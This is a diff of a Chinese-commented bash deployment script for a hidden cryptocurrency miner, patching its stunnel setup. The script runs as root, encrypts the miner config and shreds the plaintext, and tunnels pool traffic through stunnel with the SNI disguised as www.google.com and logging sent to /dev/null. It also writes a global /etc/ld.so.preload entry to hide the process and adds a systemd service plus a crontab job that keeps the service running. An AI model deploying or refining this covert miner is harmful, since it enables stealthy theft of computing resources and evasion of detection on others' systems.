@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# 隐藏挖矿进程的一键部署脚本（跳过 stunnel 语法检查，直接启动验证）
+# 隐藏挖矿进程的一键部署脚本（修复 stunnel pid 问题）
 
 if [ "$(id -u)" != "0" ]; then
     echo "此脚本需要 root 权限运行" 1>&2
@@ -149,8 +149,9 @@ openssl enc -aes-256-cbc -salt -in "$svc_conf" -out "$svc_conf_enc" -kfile "$key
 }
 shred -u "$svc_conf" || rm -f "$svc_conf"
 
-# 创建 stunnel 配置文件
+# 创建 stunnel 配置文件（添加 pid 参数）
 cat > "$stunnel_conf" <<EOF
+pid = /var/run/stunnel4.pid
 [svc]
 client = yes
 accept = 127.0.0.1:8443
@@ -158,13 +159,14 @@ connect = $pool_url
 syslog = no
 output = /dev/null
 sni = www.google.com
-ciphers = ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256
-curve = secp384r1
 EOF
 chmod 600 "$stunnel_conf"
+chown stunnel4:stunnel4 "$stunnel_conf" 2>/dev/null || echo "警告：无法更改 stunnel 文件权限"
+mkdir -p /var/run && chown stunnel4:stunnel4 /var/run 2>/dev/null || echo "警告：无法更改 /var/run 权限"
 
-# 跳过 stunnel 语法检查，直接依赖服务启动验证
-echo "创建 stunnel 配置文件完成，将在服务启动时验证..."
+# 验证配置文件是否存在
+echo "验证 stunnel 配置文件..."
+[ ! -f "$stunnel_conf" ] && { echo "错误：stunnel 配置文件 $stunnel_conf 不存在" 1>&2; exit 1; }
 
 # 设置全局 LD_PRELOAD
 [ -f "$ld_preload" ] && cp "$ld_preload" /etc/ld.so.preload.bak
@@ -211,9 +213,9 @@ chmod 644 "$svc_service"
 
 # 启用并启动服务
 echo "启用并启动服务..."
-systemctl enable stunnel4.service || { echo "启用 stunnel 服务失败" 1>&2; exit 1; }
-systemctl start stunnel4.service || { echo "启动 stunnel 服务失败，请检查 'systemctl status stunnel4.service'" 1>&2; exit 1; }
 systemctl daemon-reload || { echo "systemd 重载失败" 1>&2; exit 1; }
+systemctl enable stunnel4.service || { echo "启用 stunnel 服务失败" 1>&2; exit 1; }
+systemctl restart stunnel4.service || { echo "启动 stunnel 服务失败，请检查 'systemctl status stunnel4.service'" 1>&2; exit 1; }
 systemctl enable svc.service || { echo "启用 svc 服务失败" 1>&2; exit 1; }
 systemctl start svc.service || { echo "启动 svc 服务失败" 1>&2; exit 1; }
 echo "*/5 * * * * root systemctl is-active svc.service || systemctl restart svc.service" >> /etc/crontab
